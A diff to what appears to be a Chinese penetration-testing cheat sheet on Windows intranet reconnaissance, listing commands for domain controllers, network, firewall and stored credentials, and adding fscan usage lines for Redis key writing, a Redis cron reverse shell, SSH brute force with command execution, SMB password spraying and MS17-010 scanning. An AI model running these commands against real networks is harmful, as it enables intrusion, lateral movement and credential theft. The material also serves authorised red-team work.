@@ -35,34 +35,39 @@
 网络信息
 ----------------------------------------
 - 域控信息
-    - ``nltest /dclist:xx``
-    - ``Get-NetDomain``
-    - ``Get-NetDomainController``
-- 内网网段信息
+	+ ``nltest /dclist:xx``
+	+ ``Get-NetDomain``
+	+ ``Get-NetDomainController``
 - 网卡信息 ``ipconfig``
-- 外网出口
 - ARP表 ``arp -a``
 - 路由表 ``route print``
 - 监听的端口 ``netstat -ano``
-- 连接的端口
 - 防火墙状态及规则
-    - ``netsh firewall show config``
-    - ``netsh firewall show state``
+	+ ``netsh firewall show config``
+	+ ``netsh firewall show state``
 - hosts文件
-- DNS缓存
-    - ``Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache``
+- 扫描工具
+	+ fscan：``https://github.com/shadow1ng/fscan``
+		::
+		
+			fscan.exe -h 192.168.1.1/24  (默认使用全部模块)  
+			fscan.exe -h 192.168.1.1/16  (B段扫描)
+			fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)  
+			fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)  
+			fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)  
+			fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)  
+			fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)  
+			fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)  
+			fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)   
+			fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )  
+			fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)  
+			fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)  
+			fscan.exe -hf ip.txt  (以文件导入)
 
 密码信息
 ----------------------------------------
 + 当前系统凭据
 	- ``cmdkey /l``
-+ 浏览器中保存的账号密码
-+ 系统密码管理器中的各种密码
-+ 无人值守安装文件中的密码信息
-	- ``C:\sysprep.inf``
-	- ``C:\sysprep\sysprep.xml``
-	- ``C:\Windows\Panther\Unattend\Unattended.xml``
-	- ``C:\Windows\Panther\Unattended.xml``
 
 其他
 ----------------------------------------
